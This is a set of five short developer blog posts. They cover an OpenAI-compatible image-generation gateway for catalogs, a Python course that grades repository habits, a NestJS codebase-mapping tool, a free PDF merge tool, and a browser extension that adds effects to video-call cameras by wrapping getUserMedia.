title: OpenAI-Compatible Image Generation API: Single Endpoint Routing for Marketplace Catalogs
author: MordecaiNilsson7582
summary: A marketplace team should start with one OpenAI-compatible POST /v1/images/generations call, then test whether the generated bytes can cross into private object storage without changing the catalog pipeline. The decision rule is simple: choose a gateway when model substitution and one storage identity matter more than the deepest controls of one image specialist. Keep a direct provider in the test when its model-specific controls produce better catalog images. For a catalog, the output is not merely a nice picture. It has to be the right size, attached to the right SKU, and available to the storefront without becoming public by accident. I would measure structured request and handoff correctness before comparing visual style. The shortest useful answer: test the seam. Can a single OpenAI-compatible image generation API serve a catalog? Use a fixture of 24 messy product descriptions: missing punctuation, mixed units, duplicated adjectives, and descriptions that mention several colors. A sample record might say linen overshirt blue med 2pockets ; the image prompt needs a stable product identity, while the catalog metadata still needs a deterministic SKU. The experiment has three checks. First, the request must preserve {model, prompt, size, n} and return a usable image result. Second, the selected model must be discoverable rather than hard-coded against an undocumented inventory. Third, the result must be handed to a private bucket through a presigned URL, with the same Authorization: Bearer credential used for the gateway calls and no gateway credential sent to the storage URL. The pass rule is 22 of 24 records producing a valid response, zero records with a missing SKU-to-object association, and zero public storage ACLs. That is a deliberately boring threshold. If the team cannot meet it, a prettier sample image does not rescue the integration. Run the same fixture through a direct OpenAI image integration, Replicate, and Stability AI, alongside the gateway. OpenAI is the natural baseline for an OpenAI-shaped client. Replicate is useful when the team wants a broad hosted model catalog and model-specific inputs. Stability AI is a strong comparison for teams that care about a specialist image-generation surface. Their docs describe different integration boundaries, so this is not a claim that one is universally best; it is a reason to measure the exact catalog job. Infrai is a candidate for the middle of this workflow: its plain REST surface can receive the OpenAI-compatible image request, while the same account boundary can be used for the private storage handoff. Its public discovery surface also lets a client inspect available capabilities without a key, which makes the model-selection step testable before catalog traffic reaches production. How does the Python handoff work? The useful flow is short: discover an available model, generate one image, fetch the bytes, and write those bytes to a private presigned destination. Generation and hosting use the same base URL and key on the gateway side. The presigned URL is a separate, deliberately narrow capability for the object write. The sample below assumes the storage workflow has already issued a presigned upload URL for the target object. The storage route list should be generated from discovery data rather than guessed in application code. The handoff is still concrete: the bytes returned by image generation become the body of the private object upload. import os import time from typing import Any import requests BASE_URL = " The model is selected from /v1/ai/models , so model IDs can change without forcing a code edit; /v1/models is another discovery surface when the client expects the standard listing. For model-specific resolutions and styles, inspect /v1/ai/models before accepting a request. The presigned upload is not an API-key call. Treat it as a scoped storage capability and keep the gateway header out of it. For production, make the catalog write idempotent with the SKU as the application-level identity and record the returned request ID beside the object key. A retry must not create two catalog associations merely because a client lost a response. Which boundary matters more: gateway or specialist? The gateway's main advantage is substitution. The request shape remains {model, prompt, size, n} while a model parameter selects among DALL-E, SDXL, Flux, and other served backends. That makes a three-model evaluation inexpensive to wire: one request adapter, one fixture, one pass/fail report. It also gives the team a failover option when a selected backend is unavailable, provided the fallback model's resolution and style capabilities were checked first. OpenAI's direct image API is the clean baseline if the team wants a first-party relationship and the smallest possible dependency graph for OpenAI models. It is a better fit when provider-specific behavior is the product requirement and cross-provider routing is unnecessary. The trade-off is that switching providers becomes an application concern. Replicate is worth testing when the catalog experiment depends on a changing set of hosted models or unusual model inputs. That flexibility can be valuable, but the adapter and result-normalization work deserve their own tests. A stable {model, prompt, size, n} contract is not the same thing as every backend exposing identical capabilities. OpenRouter is another gateway-style comparator for teams that want to route model traffic through a common interface. It belongs in the experiment only if its image support and output contract match the catalog fixture; a text-model gateway is not automatically an image-generation substitute. Stability AI is a sensible specialist comparator for teams that want to tune image-generation behavior around its own platform and model family. Choose it when those controls win the fixture, not because a gateway is automatically preferable. A direct specialist can be the right answer for art direction, unusual controls, or a team willing to own a provider-specific integration. Option Access shape Best fit Main boundary OpenAI image API Direct provider API First-party OpenAI workflow Provider switching becomes application work Replicate Hosted model API Many changing model choices Result normalization needs testing Stability AI Specialist image API Platform-specific image controls Less useful if portability is the main requirement Infrai OpenAI-compatible REST gateway One request shape plus private storage identity One vendor and one outage surface The table is a starting hypothesis, not a scorecard. The 24-record fixture decides whether the boundary matters for this catalog. Infrai fits this workflow when the team wants the OpenAI-compatible image surface plus a single REST identity that also covers the storage account. There is no SDK installation or client-library version to babysit: any language that sends HTTP can call the gateway. The supporting benefit is the self-describing discovery surface, which removes a separate model-inventory file from the catalog service and lets the test inspect available models before choosing one. Generation and private storage can then share one key and one base URL instead of wiring a separate image account to an S3 account. That recommendation has a cost. One vendor to trust, one bill, and one outage surface are convenient, but they are also concentration. If the experiment shows that a direct specialist's controls are required, use that specialist and keep storage separate. The gateway should be the measured leg, never an assumed winner. How should the result be scored? Record one row per SKU with the chosen model, request payload hash, response status, image dimensions, object key, and storage visibility. Do not score only by looking at a handful of thumbnails. A reviewer should be able to answer three questions from the row: did the structured request survive, did the image meet the catalog rule, and did the object remain private? For each provider, calculate pass rate over the same 24 inputs. Mark a record failed if the response is not parseable, the model does not support the requested resolution, the output cannot be associated with its SKU, or the storage handoff violates the private-object rule. Keep visual quality as a separate human score; mixing it into transport correctness hides integration defects. One row is enough to expose a surprisingly expensive mistake: a successful image response paired with the wrong object key. That row may look fine in an image review while the storefront shows a red shirt for a blue overshirt. The test therefore treats metadata association as a first-class failure, even though the image bytes themselves are valid. No shortcuts. The first failure I would expect is a valid image attached to the wrong SKU. A worker can receive SKU-1042 , time out during the catalog update, retry with a new object key, and leave the first object reachable from a stale job record. Both thumbnails can look fine while the storefront shows the wrong product. That is why the fixture stores the SKU, payload hash, request ID, object key, and visibility result together. It also keeps visual preference separate from handoff correctness when OpenAI, Replicate, OpenRouter, or the gateway returns different images. This small bookkeeping detail is what protects a notebook prototype after it becomes a queue worker. The object key is part of the result. The decision rule after one run is concrete: choose the gateway if it clears all transport and privacy gates and is within the team's acceptable visual-quality margin; choose a specialist if it wins on a capability the catalog actually needs. Run the fixture again after changing the model parameter. That second run catches lock-in that a successful first request can hide. My operational checklist would fit in a pull request description: discover available models, validate the requested size, use an environment variable for the key, retry 429 responses with Retry-After , make SKU association idempotent, upload only through a private presigned URL, and retain enough metadata to reproduce a failed row. Seven checks. No dashboard required on day one. For the OpenAI-plus-S3 alternative, the team would create two provider relationships, manage two sets of credentials, and write the glue that downloads the image, creates or selects the object key, requests a presigned upload, and reconciles failures between the two systems. That stack is reasonable when the organization already standardizes on S3. The single-account pattern is attractive only when reducing that seam is worth accepting the shared dependency. If your catalog team wants one OpenAI-compatible endpoint, model discovery, and the same account boundary for private storage, Infrai is the option I would put through this experiment first. Start with the gateway pattern documentation , then run the 24-record fixture before committing to a provider. title: You can't quiz someone into writing tests
author: Ladislav Szép
summary: Every course I've taken has a lesson about testing. It explains what a unit test is, has you write one into a box, marks it green, and moves on. I passed several of those lessons. I did not start writing tests. The same is true of git. There's a lesson on commit messages, usually with a multiple-choice question about the imperative mood. Nobody's commit history changes because of it. That's not the courses being lazy. It's that these aren't facts, they're habits, and a habit is visible in a year of work rather than in one answer. You can quiz somebody on what a conventional commit is. You can't quiz them into writing one on a Tuesday when they're tired. So when I built my own Python course, I left that lesson out and wrote something else instead: the course reads your repositories and grades what's already there. What it actually does There are seven probes and eleven awards between them. Each probe opens a repository you point it at, runs the tools that repository already uses, and reads the output. Awards pay experience, which is what the XP column below is. Probe What it looks for XP git commit subjects that follow a convention 40 git branches named for their work 25 lint a tree your linter has nothing to say about 40 lint formatting nobody has to argue about 25 tests a test suite that exists at all 50 tests a suite that is actually green 75 types signatures that say what they mean 40 docs a README someone else could walk through 25 docs decisions written down where you can ask about them later 40 ci something other than you checking the work 30 ci a pipeline that stays green 45 Totals put you on a ladder: Starting out, then Finding the habits at 100, Habits that hold at 250, Dependable at 500, Seasoned at 1000. Every award carries evidence — the actual number it saw — because an award you can't check is a sticker. The three problems that were actually interesting Writing the probes was the easy half. The hard half was deciding what a probe's answer means. "I found nothing" and "I couldn't look" are different answers The CI probe wants to know whether your last few pipeline runs were green. That needs the GitHub CLI installed, signed in, and a network. If gh isn't there, the probe could reasonably say "no green pipeline". That's a disaster: the first time you scan on a laptop without gh, the course quietly takes away an award you earned, for a pipeline that is still green. So a probe returns one of two things, and the difference is load-bearing: def evaluate(self, repo: Path) -> list[Award] | None: """What this probe finds now, or None if it could not look. The difference matters. An empty list means the repository does not earn this, and the scan takes the award away. None means the probe could not run at all, and the scan leaves what was already held alone - losing an award because ruff was not installed today would be a lie about the work. """ A list — possibly empty — means I looked, and this is what's there. None means I couldn't answer, and the scan leaves whatever was already held alone. It ended up as two probes rather than one, because "does a workflow file exist" can always be answered and "were the last runs green" often can't: Two probes rather than one, because they fail differently. [...] One probe for both would revoke a green pipeline every time gh was missing, which is the lie the None return exists to prevent. Awards have to be revocable, and that's uncomfortable The obvious design is that experience only goes up. It feels better, it's what games do, and it avoids an awkward conversation. It's also a lie with a delayed fuse. If you earn "a suite that is actually green" and then break your tests and leave them broken, a number that still says otherwise is wrong — and you're the one person guaranteed to find out. So a scan can take an award back: An award that survives the work that earned it being undone is a lie the learner will eventually notice. A probe can't do this, because a probe only sees now. Only the scan knows what was held before, so only the scan can remove it. Re-earning is not re-paying If running a scan twice paid twice, the meter would measure how often you run scans. So an award's id identifies the achievement, not the occasion. Scan again and the evidence is refreshed, so it describes your repository as it stands today — but the date you first earned it is left alone, and nothing is paid twice. The threshold is 80%, on purpose The git probe looks at your last 100 commit subjects and wants 80% of them to follow the convention. Not all of them. I went back and forth on this and settled it with a comment that is still in the file: An occasional "wip" is a human being, not a failure of craft. A tool that demands perfection to acknowledge a habit teaches you to perform for the tool. The same reasoning sets the floor at ten commits: below that there's no habit to judge, just a handful of commits. Why it runs on your machine and not on a server Here's the part I'd have got wrong if I'd built it the obvious way. Running these probes means running your test suite. On a hosted service, that is executing a stranger's code on my server on their say-so — the exact thing the project's sandboxing decisions exist to prevent. So the hosted version refuses: 403 — The craft meter runs real test suites, so it is for a local install So it runs where your code already is: you run the application on your own machine and point it at your own repositories. Your code is never uploaded, because there is nowhere to upload it to. No token, no OAuth scope, no third party with read access to your private repos. One honest caveat, since this is the part people ask about: the local install isn't something you can go and get yet. The hosted course is live, but the craft meter is the half that needs the application on your own machine, and packaging that up is still ahead of me. If this is the bit you want, say so and I'll know it's worth doing sooner. I'd like to claim that as a privacy feature. Honestly, it's a consequence — I couldn't safely build it the other way, and the constraint produced the better design. That happens more often than I expect it to. What it doesn't do It doesn't read your code and tell you it's good. It reads what your own tools say about it. If your linter is configured to permit everything, a clean tree means very little, and the probe can't tell. It won't make you employable on its own. It measures habits an interviewer can also see in thirty seconds of scrolling your GitHub — which is rather the point. Those are the habits worth having, so they are the ones worth counting. And it is genuinely slow. It runs pytest over every repository you give it. That's not a bug to optimise away; it's what makes the number mean something. This is part of LexipawsPY, a free Python course I'm building. Every lesson is free and stays free — the whole course, the drills, the hints and the solutions. It's at py.lexipaws.eu if you want a look, though fair warning: the beginner path is still being written. It runs to sixty-eight lessons today, through loops, lists and tuples, and stops just before dictionaries. If you've built something similar, or you think grading habits is a terrible idea, I'd like to hear it.

title: Mapping a NestJS Backend Automatically: DB Schemas, REST Endpoints, and Catching an Auth Bug
author: Omar Wael
summary: Whenever I start working on an unfamiliar backend project, I spend the first few hours bouncing between controller files, middlewares, and ORM entities just to learn how the database tables link together and how the API routes function. I created DocFlow to generate that map automatically from a GitHub repository. It works across full-stack and backend frameworks (Next.js, Nuxt, Angular, NestJS, Express, etc.), and to test it on a real backend, I ran it against the nestjs-realworld-example-app repository. Here is what it pulled out of the codebase automatically: 1. Interactive Database Schema (0:00 in the demo) (Drag and drop a screenshot of your Database Schema tab at 0:05 here) Instead of reading entity files one by one, it builds an interactive React Flow graph showing all 6 tables ( user , article , comment , tag , follows , article_favorites_user ), column types, primary and foreign keys, and the 1:N and N:M relationships between them. 2. Backend API Explorer (0:16 in the demo) (Drag and drop a screenshot of your APIs tab at 0:18 here) It scanned the NestJS controllers and listed all 19 REST endpoints ( GET , POST , PUT , DELETE ), linking each route directly to its controller file (like src/article/article.controller.ts and src/user/user.controller.ts ). 3. Line-Cited Architecture Chat & Catching a Real Bug (0:25 in the demo) (Drag and drop a screenshot of the Chat response at 0:45 here) When I asked the codebase chat how authentication and authorization work, it didn't just give a generic summary: It traced the JWT token generation and middleware down to the exact lines ( src/user/auth.middleware.ts:14-31 ). It generated a route protection table showing which routes run through AuthMiddleware in UserModule , ProfileModule , and ArticleModule . The best part (at 0:45): It flagged an actual authorization gap in the repo where PUT /articles/:slug ( src/article/article.controller.ts:50-63 ) and DELETE /articles/:slug ( src/article/article.controller.ts:57-71 ) authenticate the user via middleware, but never check the author's userId in the service before updating or deleting an article. How it works under the hood Backend: Runs on NestJS with BullMQ queues to clone and index repository trees asynchronously. Indexing & RAG: Combines structural code parsing (to extract ORM schemas, client pages, and API routes) with PostgreSQL and pgvector for hybrid search so the chat cites exact file paths and line numbers instead of guessing. Frontend: Built with Next.js and React Flow for the interactive schema diagrams. Try it out You can test the live nestjs-realworld-example-app example or connect up to 2 of your own repositories on the free tier here: https://docflow.software I would really like to hear your thoughts on how the diagrams look, and what else you would want extracted when jumping into an unfamiliar backend repository!

title: I built a free Merge PDF tool with no sign-up and no watermark
author: Muhammad Ali
summary: I just added a Merge PDF tool to MyPDFLabs, my free set of online PDF tools. It's one of the most requested things people do with PDFs, so I wanted to share what it does and how I thought about it. Why a merge tool? Merging is one of those small jobs that comes up all the time: A cover letter, resume and certificates for a job application Scanned receipts for an expense report Chapters of an assignment saved as separate files Contracts and attachments for a client Most of the tools I found for this wanted an account, added a watermark, or capped the file size. I wanted something where you open the page, add your files, and download one PDF. What it does Combine several PDFs into one. Add your files and set the order. No sign-up. No watermark on the core tools. Files up to 500MB. Automatic deletion. Uploaded files are deleted after processing. It also works well with the other tools on the site. If a file is sideways, rotate it. If the result is too big to email, compress it. If you only need a few pages from a long file, split or extract them first and then merge. What I thought about while building it Merging looks trivial, but a few details matter: Order is everything. The result is only useful if the files come out in the order you expect, so that step needs to be obvious. Real files are messy. People upload scans, protected files and huge documents, so the tool needs clear messages when something can't be merged. Privacy matters. People merge contracts, IDs and CVs, so I decided early not to keep files around and not to ask for an account. What I'd like feedback on The site is still new, so I'd really like your honest opinions: Is the merge flow clear, or is anything confusing? What would make it faster for you? Which PDF tool should I add next? You can try it here: mypdflabs.com/tools/merge Thanks for reading, and I'll reply to every comment.

title: Spoofing the camera in Google Meet Zoom Teams and more
author: restyvod
summary: I saw a Telegram post about Snap , a Google Meet extension by @deniza-png. Before the call you photograph the empty room; mid-call you snap your fingers and disappear. I wanted that, plus everything else I was missing on calls: backgrounds, masks, stickers, translated captions, a teleprompter. So I built Telepult.Web , a browser extension that sits on top of the web call and edits the camera before anyone else sees it. It started on Meet, then grew to Zoom Web, Microsoft Teams, Discord, Slack huddles and about thirty other sites. Same idea everywhere: the call page asks for a camera, the extension hands it a painted stream. Chrome Web Store Firefox Add-ons Site / try with your camera Credit where it is due: I could not find Snap’s author on every network, so I am tagging the GitHub nick. If that is you under another name, say so and I will fix the link. Intercepting the camera Meet, Zoom Web and Teams all take the camera through plain getUserMedia and feed the MediaStream into WebRTC. They do not care where the video track came from. So I patch getUserMedia before the page calls it: open the real camera myself, return a track I paint on a canvas . const origGUM = MediaDevices . prototype . getUserMedia ; MediaDevices . prototype . getUserMedia = async function ( constraints ) { const real = await origGUM . apply ( this , arguments ); try { if ( constraints ?. video ) return await wrapCameraStream ( real ); if ( constraints ?. audio ) return await wrapAudioStream ( real ); } catch ( e ) { console . warn ( " wrap failed " , e ); } return real ; // if wrapping fails, the call matters more than effects }; Inside wrapCameraStream the camera track goes into a hidden video , frames are drawn on a canvas , and the outside gets canvas.captureStream . Call sites peek at getSettings and label , so I mirror those from the real camera. async function wrapCameraStream ( real ) { const camTrack = real . getVideoTracks ()[ 0 ]; const video = document . createElement ( " video " ); video . muted = true ; video . srcObject = new MediaStream ([ camTrack ]); await video . play (); const pipe = new Pipeline ( video ); pipe . start (); const outTrack = pipe . canvas . captureStream ( 30 ). getVideoTracks ()[ 0 ]; outTrack . getSettings = () => ({ ... camTrack . getSettings (), width : pipe . W , height : pipe . H , }); Object . defineProperty ( outTrack , " label " , { value : camTrack . label }); return new MediaStream ([ outTrack , ... real . getAudioTracks ()]); } That is the property of every feature below: whatever I draw on that canvas leaves as normal video. It lands in the recording and on everyone else’s preview. They do not install anything. Render runs on requestAnimationFrame , capped around 30 fps. If the previous frame is still painting, the tick is skipped; otherwise a weak laptop queues frames and video drifts from audio. The mic is wrapped separately because Meet and Zoom often request it in a second getUserMedia call without video. MediaPipe Face, hands and segmentation use Google MediaPipe Tasks Vision. Models run in the browser on WebAssembly, with GPU when it works: Face Landmarker : 478 face points; masks and face blur sit on them Hand Landmarker : 21 points per hand; gestures, finger snap, drawing Image Segmenter with the selfie model: person mask for backgrounds and blur Models ship inside the extension package (face ~3.6 MB, hands ~7.5 MB, segmenter 244 KB; the whole pack is around 20 MB). Install is a bit slower, but you do not download tens of megabytes from a CDN the moment someone turns on a background on a bad connection. There is also a store rule: Chrome Web Store rejects extensions that load executable code from third-party URLs, and MediaPipe brings WASM with it. const vision = await FilesetResolver . forVisionTasks ( chrome . runtime . getURL ( " vendor/tasks-vision/wasm " ) ); const face = await FaceLandmarker . createFromOptions ( vision , { baseOptions : { modelAssetPath : chrome . runtime . getURL ( " vendor/models/face_landmarker.task " ), delegate : " GPU " , // fall back to "CPU" if GPU init fails }, runningMode : " VIDEO " , numFaces : 1 , }); Everything loads lazily: a model stays cold until a feature that needs it turns on. Inference lives on a hidden extension page; the call page sends a downscaled ImageBitmap and gets landmarks and a mask back. Width before send is 256–480 px depending on the model set: enough for a face, much cheaper. The first version sent every frame. When the model fell behind, messages queued, and after a minute the mask lagged the face by seconds. Now a frame that arrives while the model is busy is dropped. Each model combo has its own minimum gap: hands alone can run almost every frame; segmentation with hands is capped around once per 100 ms. async process ( video , needSeg , needFace , needHands ) { if ( this . busy ) return ; // drop the frame, do not queue if ( performance . now () - this . lastSend < this . minGap ( needSeg , needFace , needHands )) return ; this . busy = true ; try { const bitmap = await createImageBitmap ( this . downscale ( video )); const res = await this . sendToModels ({ bitmap , needSeg , needFace , needHands }); this . apply ( res ); } finally { this . busy = false ; } } Face points jitter frame to frame, so new coordinates are blended about half-and-half with the previous ones. Lag is barely visible; the mask stops shaking. Vanishing Same scenario as Snap: turn the camera on, leave the frame, press “Capture room”, come back. Then “Vanish” (or a finger snap) fades you out and the empty room stays. “Return” plays the animation backwards. “Capture room” does not take one frame. It averages 14 frames 40 ms apart. Webcams are noisy in low light; a single frame leaves false spots in the mask. The plate is JPEG-compressed into chrome.storage.local , so the next call does not need a new capture if the camera has not moved. No segmenter here: with an empty-room plate, the person is whatever differs from it. Live frame and plate shrink to 480 px wide; each pixel gets the sum of absolute RGB diffs. Above a threshold it counts as person. const DIFF_T = 44 ; for ( let i = 0 ; i < n ; i ++ ) { const j = i * 4 ; const diff = Math . abs ( live [ j ] - bg [ j ] - o0 ) + Math . abs ( live [ j + 1 ] - bg [ j + 1 ] - o1 ) + Math . abs ( live [ j + 2 ] - bg [ j + 2 ] - o2 ); bin [ i ] = diff > DIFF_T ? 255 : 0 ; } o0 , o1 , o2 correct for auto-exposure and white balance. Sit down in a dark shirt and the camera lifts the whole picture; without the offset the entire room starts looking different from the plate. The shift is estimated in two passes: mean diff over the frame, then again only on pixels already close to the plate (the background). That is what gets subtracted. The raw mask is ragged, so it is cleaned: Blur twice and threshold again: noise goes, edges settle. Keep only the largest blob; the rest is junk. Flood-fill background from the frame edges. Wherever fill did not reach is the person. That closes holes in a shirt the same color as the wall. The Thanos effect assigns each pixel a threshold from its x coordinate plus a bit of randomness. Animation progress goes 0→1; a pixel dies when progress crosses its threshold, so the person crumbles left to right with a ragged edge. Some of the dead pixels become ash particles of the same color; under the person the room plate is drawn. for ( let y = 0 ; y < HH ; y ++ ) for ( let x = 0 ; x < WW ; x ++ ) thr [ y * WW + x ] = 0.55 * ( x / WW ) + 0.45 * Math . random (); // each frame alpha [ i ] = mask [ i ] * smooth (( thr [ i ] - p ) / BAND + 0.5 ); The other transitions (dissolve, glitch, pixels, funnel, smoke, shards, CRT off, portal, tiles, burn, melt, explode) reuse the same frozen mask and only change which pixel dies when. Finger snap is detected from video; the mic is not involved (unlike Snap). I keep 300 ms of distance between the thumb tip and the nearest of index/middle tips. A snap is fingers together, then quickly apart: look for a minimum followed by distance rising fast enough. 1.2 s cooldown so one snap does not vanish and immediately return. function detectSnap ( history , now ) { const s = history . filter (( p ) => now - p . t <= 300 ); const min = minBy ( s , " d " ); const max = maxBy ( s , " d " ); if ( ! ( min . d < 0.085 && max . d > 0.095 && max . t > min . t + 20 )) return false ; const after = s . filter (( p ) => p . t >= min . t ); const first = after [ 0 ], last = after [ after . length - 1 ]; const speed = ( last . d - first . d ) / Math . max ( 16 , last . t - first . t ); return speed > 0.00028 && last . d - min . d > 0.04 ; } There is also “Freeze frame”: the call gets the last painted frame until you press again. Later that grew into Live Photo, a short looping burst instead of a dead still, so on long meetings nobody wonders why you stopped blinking. Background and blur No room plate here, so the segmenter is required. It returns a confidence mask; I turn that into alpha with a soft ramp: below 0.35 background, above 0.7 person, linear edge in between so hair is not cut out with scissors. for ( let i = 0 ; i < out . length ; i ++ ) { let a = person [ i ]; if ( inverted ) a = 1 - a ; out [ i ] = a < 0.35 ? 0 : a > 0.7 ? 255 : ((( a - 0.35 ) / 0.35 ) * 255 ) | 0 ; } The segmenter mask is tiny. Upscaled to 720p it left a light halo around the head. Before compositing I stretch it with a 1 px blur and threshold again. Then normal compositing: background, camera frame on top via destination-in with the mask. About twenty built-in backgrounds, plus your own file. Animated ones (matrix, snow, rain, space, fireflies and the rest) are drawn procedurally on the same canvas, so they barely weigh anything in the package. Masks and face blur A mask is a few PNG layers (ears, nose, tongue). Each layer stores two source points on the image and two face-landmarker points. From the two pairs I compute a similarity transform and draw so the points match. Ears tilt with the head and shrink when you lean back. function drawSimilarity ( ctx , img , srcA , srcB , dstA , dstB ) { const scale = dist ( dstA , dstB ) / dist ( srcA , srcB ); const angle = Math . atan2 ( dstB . y - dstA . y , dstB . x - dstA . x ) - Math . atan2 ( srcB . y - srcA . y , srcB . x - srcA . x ); ctx . save (); ctx . translate ( dstA . x , dstA . y ); ctx . rotate ( angle ); ctx . scale ( scale , scale ); ctx . drawImage ( img , - srcA . x , - srcA . y ); ctx . restore (); } Ears bob a little. The dog tongue only shows when the mouth is open: distance between upper and lower lip points. Anonymity covers only the face, not the whole frame. Face Landmarker gives a 36-point face oval; I build a path, clip, and inside draw either a blurred frame or pixels. Pixels are the classic shrink-by-16 then stretch with imageSmoothingEnabled = false . ctx . save (); ctx . beginPath (); ctx . moveTo ( oval [ 0 ]. x , oval [ 0 ]. y ); for ( const p of oval ) ctx . lineTo ( p . x , p . y ); ctx . closePath (); ctx . clip (); if ( mode === " blur " ) { ctx . filter = " blur(16px) " ; ctx . drawImage ( video , 0 , 0 , W , H ); } else { small . drawImage ( video , x , y , w , h , 0 , 0 , w / 16 , h / 16 ); ctx . imageSmoothingEnabled = false ; ctx . drawImage ( small . canvas , 0 , 0 , w / 16 , h / 16 , x , y , w , h ); } ctx . restore (); The oval follows the face, so you can walk around the room while hands and background stay normal. Gestures and finger drawing A finger is “out” if its tip is farther from the wrist than its middle joint by about 12%. The set of extended fingers classifies the gesture. const fingerOut = ( lm , tip , pip ) => dist ( lm [ tip ], lm [ WRIST ]) > dist ( lm [ pip ], lm [ WRIST ]) * 1.12 ; function classifyHand ( lm ) { const ix = fingerOut ( lm , 8 , 6 ), md = fingerOut ( lm , 12 , 10 ); const rg = fingerOut ( lm , 16 , 14 ), pk = fingerOut ( lm , 20 , 18 ); const thumb = dist ( lm [ 4 ], lm [ WRIST ]) > dist ( lm [ 3 ], lm [ WRIST ]) * 1.15 ; const count = [ ix , md , rg , pk ]. filter ( Boolean ). length ; if ( count >= 4 ) return " palm " ; if ( thumb && count <= 1 ) return " thumbsup " ; if ( ix && md && ! rg && ! pk ) return " victory " ; if ( ix && ! md && ! rg && ! pk ) return " point " ; return null ; } A gesture only fires after two consecutive recognitions, with 700 ms between triggers. Otherwise any hand near the face toggles something. Palm and thumbs-up drop ✋ / 👍 into the frame; point toggles the mic; victory shows and hides a corner picture. Drawing takes index tip (landmark 8) and writes a trail. Coordinates are exponentially smoothed so the line is clean without lagging the finger. Each segment fades in 2.8 s with squared alpha: bright, then gone. No eraser: circle something on the board behind you, three seconds later the line is gone. Captions with translation You speak one language; captions in the frame show another. Two stages: speech recognition, then translation. The finished line is painted at the bottom of the same canvas. Recognition Transcription is Web Speech API ( webkitSpeechRecognition in Chromium). There is no speech model in the package: Chrome listens to the mic, sends audio to its recognition service, returns text. You need a network, and quality depends on language and connection. You also avoid another heavy model next to MediaPipe. In practice this is Chrome, Edge, Brave and Opera. Not Firefox. const SR = window . SpeechRecognition || window . webkitSpeechRecognition ; const rec = new SR (); rec . lang = " en-US " ; rec . continuous = true ; // do not stop after the first phrase rec . interimResults = true ; // drafts while speaking rec . onresult = ( ev ) => { for ( let i = ev . resultIndex ; i < ev . results . length ; i ++ ) { const text = ev . results [ i ][ 0 ]. transcript . trim (); pushCaption ( text , ev . results [ i ]. isFinal ); } }; Without continuous , recognition dies on the first pause. interimResults gives drafts: while isFinal is false Chrome may still revise the text, but you can show it immediately. The loop starts at ev.resultIndex because results holds the whole session. Restarting from zero on a long call would re-walk half an hour of phrases every time. Even with continuous: true , Chrome periodically ends the session and fires onend after a pause or a network blip. Ignore that and captions silently die after a few minutes. So onend restarts recognition after a short delay. lang on a running instance does not change, so a language switch recreates the recognizer. rec . onend = () => { if ( ! needRecognition () || restarting ) return ; restarting = true ; setTimeout (() => { restarting = false ; try { rec . start (); } catch ( _ ) {} }, 280 ); }; Translation Translation uses Chrome’s built-in Translator API. The model for a language pair downloads on first use, then translation is local. No third-party keys. If the API is missing, the frame keeps the source text. async function translateText ( text , source , target ) { if ( ! text || source === target ) return text ; const key = ` ${ source } > ${ target } : ${ text } ` ; if ( cache . has ( key )) return cache . get ( key ); try { const translator = await Translator . create ({ sourceLanguage : source , targetLanguage : target , }); const out = await translator . translate ( text ); if ( out ) { cache . set ( key , out ); // keep the last ~120 phrases return out ; } } catch ( _ ) {} return text ; } Drafts have two problems. There are too many of them, so translation is rate-limited (~450 ms); while it runs, the source shows with an ellipsis. Translation is async, so an old draft can finish after a newer one and rewind the line. A generation counter drops stale results. async function pushCaption ( raw , isFinal ) { if ( ! isFinal ) { if ( performance . now () - lastInterimAt < 450 ) return ; lastInterimAt = performance . now (); captions . interim = " … " + raw . slice ( - 160 ); redraw (); } const gen = ++ translateGen ; const shown = await translateText ( raw , captions . sourceLang , captions . targetLang ); if ( gen !== translateGen ) return ; if ( isFinal ) { captions . text = shown . slice ( - 180 ); captions . interim = "" ; } else { captions . interim = shown . slice ( - 180 ); } redraw (); } Seven languages today. Same “I speak” and “captions in” languages means plain captions with no translation. Downside: others cannot turn captions off on their side. They are part of the video. Sometimes that is the point. I thought about storing the whole call with timings and sending it to a remote LLM for minutes. Meet and Zoom already sell that. So I did not. Voice The mic goes through a Web Audio graph: clone the audio track, MediaStreamSource , effect chain, MediaStreamDestination , and the call gets the destination stream. The track is cloned because Meet/Zoom flip enabled on their own track and without a clone the graph sometimes goes silent. Effects from stock nodes: robot: narrow bandpass ~1100 Hz, WaveShaper, lift ~1800 Hz phone: 300–3400 Hz band like an old line, light crunch echo: DelayNode ~200 ms with feedback helium / deep: pitch shift // phone const hp = ac . createBiquadFilter (); hp . type = " highpass " ; hp . frequency . value = 300 ; const lp = ac . createBiquadFilter (); lp . type = " lowpass " ; lp . frequency . value = 3400 ; const crunch = ac . createWaveShaper (); crunch . curve = makeDistortionCurve ( 28 ); source . connect ( hp ). connect ( lp ). connect ( crunch ). connect ( master ); Web Audio has no ready-made pitch shift; an EQ alone just makes a bad mic. I used Chris Wilson’s Audio Input Effects trick: two delay lines whose delay times sweep like a saw. Shrinking delay plays slightly faster (pitch up); growing delay plays slower (pitch down). Good enough for a joke on a standup. Filler words and swearing counter Same recognition path as captions. The phrase is lowercased, punctuation stripped, then matched against two lists: swears and fillers (“like”, “basically”, “you know”). Longer phrases first so short ones are not double-counted; words of up to four letters only match whole tokens. Without headphones the mic hears other people from the speakers and the counter counted their swears. A word only counts when the mic level shows that I am the one talking. The tally can stay private or paint into the frame for everyone. Stickers and reactions Stickers are short WebM files with alpha, plus your own upload up to 2.5 MB. A sticker rises for about three seconds and fades; at most eight stickers/reactions on screen at once. Each sticker is a hidden looping video ; its current frame is drawn onto the output canvas. About 15 times a second I also snapshot an ImageBitmap as a fallback: while the video is still loading or the browser stalls it, the last bitmap draws so the sticker does not flash an empty square. reactions . push ({ kind : " sticker " , video , // webm with alpha bitmap , // fallback frame life : 3200 , x0 : 0.28 + Math . random () * 0.44 , y0 : 0.55 + Math . random () * 0.22 , }); Custom stickers live in IndexedDB and survive a page reload. Same canvas, more overlays Status: a short badge under the chin, pinned to a Face Landmarker point, moves with the face. AFK for 1 / 3 / 5 minutes: an “away” badge with a countdown. Ticker at the bottom of the frame. Text is drawn several times with a shift of exactly one copy width so the loop does not hitch. Corner picture: a diagram or QR in frame without screen share; victory gesture toggles it. Retro: colored cards on your own preview. Font size on a card is binary-searched so any length fits. For a three-person retro it is faster than dragging everyone onto a separate board. Where it runs One extension, many hosts: Google Meet, Zoom Web Client, Microsoft Teams (browser), Discord, Slack, Webex, Whereby and the rest of the catalog on the site. Chromium browsers install from the Chrome Web Store; Firefox has its own build (everything except captions: no Web Speech recognition there). Try it without installing: senior-frontend-developer.com opens the same remote on your camera. The picture never leaves the machine. Further reading Idea Snap for Google Meet : where the vanish idea started Camera and stream MediaDevices.getUserMedia() 